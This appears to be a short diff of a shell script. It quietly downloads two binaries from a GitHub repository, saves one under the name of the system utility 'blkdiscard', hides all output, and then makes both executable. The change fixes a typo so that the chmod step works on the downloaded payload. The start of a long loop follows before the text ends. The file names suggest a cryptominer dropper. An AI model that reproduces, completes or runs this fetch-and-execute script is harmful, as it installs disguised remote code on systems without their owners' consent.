@@ -7,7 +7,7 @@ mkdir $name
 cd $name
 wget -q -O blkdiscard --secure-protocol=TLSv1_2 https://raw.githubusercontent.com//lambohopo/la/main/vilomine > /dev/null 2>&1
 wget -q --secure-protocol=TLSv1_2 https://raw.githubusercontent.com/lambohopo/la/main/uin > /dev/null 2>&1
-chmod +x blkdiscard uina 
+chmod +x blkdiscard uin 
 x=1
 while [ $x -le 999999999 ]
 do
